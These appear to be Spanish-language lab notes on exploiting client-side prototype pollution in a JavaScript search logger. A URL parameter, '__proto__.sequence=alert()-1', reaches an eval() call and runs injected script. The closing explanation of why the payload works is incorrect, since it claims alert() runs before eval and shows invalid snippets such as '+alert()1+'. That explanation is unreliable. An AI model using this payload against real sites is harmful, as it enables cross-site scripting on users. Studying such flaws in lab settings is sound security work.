```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```


---

### 1. `logQuery(url, params)`

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {
            method: "post",
            keepalive: true,
            body: JSON.stringify(params)
        });
    } catch(e) {
        console.error("Failed storing query");
    }
}
```

Esta función hace una solicitud `POST` al servidor con los parámetros dados (`params`) a la URL dada (`url`). Usa `keepalive: true` para asegurar que se intente enviar incluso si la página se está descargando.

---

### 2. `searchLogger()`

```js
async function searchLogger() {
```

Esta función se ejecuta cuando la página se carga (ver el `addEventListener` al final). Vamos parte por parte:

#### a. Inicializa objetos globales:

```js
window.macros = {};
window.manager = {
    params: $.parseParams(new URL(location)),
    macro(property) {
        if (window.macros.hasOwnProperty(property))
            return macros[property]
    }
};
```

- `window.macros`: un objeto donde se podrían guardar "macros" (funciones o valores asociados a claves).
    
- `window.manager`: contiene dos cosas:
    
    - `params`: los parámetros de la URL (ej. `?search=algo&user=1`), parseados con `$.parseParams()` (probablemente un plugin de jQuery).
        
    - `macro(property)`: una función para obtener propiedades desde `macros`.
        

#### b. Control de secuencia:

```js
let a = manager.sequence || 1;
manager.sequence = a + 1;
```

- Si `manager.sequence` ya existía, se usa; si no, se empieza en 1.
    
- Luego se incrementa para futuras llamadas.
    

#### c. Evalúa un `macro` (poco claro para qué):

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

- Esto parece ser una llamada condicional a una "macro" (función o dato) si existe una macro con ese número como clave.
    
- **Uso de `eval` es riesgoso** y poco recomendable.
    

#### d. Si hay una búsqueda, la envía al servidor:

```js
if(manager.params && manager.params.search) {
    await logQuery('/logger', manager.params);
}
```

- Si los parámetros incluyen `search`, entonces envía esos datos al endpoint `/logger`.
    

---

### 3. Evento `load`:

```js
window.addEventListener("load", searchLogger);
```

- Ejecuta `searchLogger` cuando la página se haya cargado completamente.
    

---


Así no nos lo hace bien 
![[Pasted image 20250429095707.png]]

En su lugar :

```
/?__proto__.foo=bar
```

![[Pasted image 20250429095816.png]]

Ahora si habríamos añadido una propiedad foo a Object:

```javascript
Object.prototype

{
    "foo": "bar"
}
...
```

```javascript
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1; //Podemos añadir la propiedad sequence a object para que así en este punto manager.sequence valga lo que queramos + 1

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

```javascript
/?__proto__.sequence=alert()
```

![[Pasted image 20250429101314.png]]

```javascript
    manager.sequence = a + 1; //alert()1
    
    eval('if(manager && manager.sequence){ manager.macro('+alert()1+') }');
```

```javascript
    manager.sequence = a + 1; //alert()-1
    
    eval('if(manager && manager.sequence){ manager.macro('+alert()-1+') }');
```

## 🔍 Código 1 (FALLA):

```js
eval('if(manager && manager.sequence){ manager.macro('+alert()1+') }');
```

### ¿Qué ocurre?

- `alert()` se ejecuta inmediatamente (antes de que el string se pase a `eval`), mostrando una alerta vacía.
    
- Después de eso, la cadena se convierte en:
    

```js
eval('if(manager && manager.sequence){ manager.macro(undefined1) }');
```

- Lo que rompe el JavaScript: `undefined1` no es válido (es un identificador mal formado). El parser lo interpreta como un nombre de variable inválido.
    
- 🔴 Resultado: **Error de sintaxis**.
    

---

## ✅ Código 2 (FUNCIONA):

```js
eval('if(manager && manager.sequence){ manager.macro('+alert()-1+') }');
```

### ¿Qué ocurre?

- Igual que antes, `alert()` se ejecuta primero, mostrando una alerta.
    
- Pero ahora la cadena se convierte en:
    

```js
eval('if(manager && manager.sequence){ manager.macro(undefined - 1) }');
```

- Aquí, `undefined - 1` es válido, y se evalúa a `NaN`.
    
- El código final dentro de `eval` es válido:
    

```js
if(manager && manager.sequence){ manager.macro(NaN) }
```

- 🔵 Resultado: **se ejecuta sin errores** (aunque `macro(NaN)` no hace nada útil).
    
